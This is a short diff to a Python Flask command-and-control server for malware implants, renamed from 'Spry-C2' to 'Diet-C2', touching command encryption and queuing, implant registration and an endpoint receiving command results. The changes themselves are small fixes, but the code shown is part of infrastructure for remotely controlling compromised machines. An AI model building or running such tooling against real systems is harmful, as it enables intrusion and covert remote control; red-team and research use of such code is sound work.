@@ -35,7 +35,7 @@ AES_INSTANCE = encryption.AESCipher(ENC_KEY)
 def store_and_queue_command(cmd_str: str, implant_command: storage.ImplantCommand, operator_name: str):
     
     # Encrypt the command
-    enc_cmd_str = AES_INSTANCE.encrypt(raw_str=cmd_str)
+    enc_cmd_str = AES_INSTANCE.encrypt(raw_str=cmd_str).decode('utf-8')
 
     # Add the encrypted command string to the implants queue
     implant_db.dict[implant_command.implant_name].queue_command(enc_cmd_str)
@@ -88,8 +88,6 @@ def implant_register():
         major_v = data.split(":::")[0]
         build_num = data.split(":::")[1]
         sleep_time = data.split(":::")[2]
-
-        print(data)
 
         # Generate a name
         new_implant_name = encryption.id_generator(N=4)
@@ -191,7 +189,7 @@ def str_command():
     cmd_id = headers["X-Command-Id"]
 
 
-    # Get the command string
+    # Get the command string and decode from bytes
     cmd_str = request.form['cmd_str']
 
     # If there is a command involving a file
@@ -235,6 +233,6 @@ def str_command():
     return "0"
 
 if __name__ == "__main__":
-    print(f"Starting Spry-C2 server on {SERVER_IP} on port {SERVER_PORT}")
+    print(f"Starting Diet-C2 server on {SERVER_IP} on port {SERVER_PORT}")
     # Put the flask server on a seperate thread, continue on to use the CLI interface
     app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
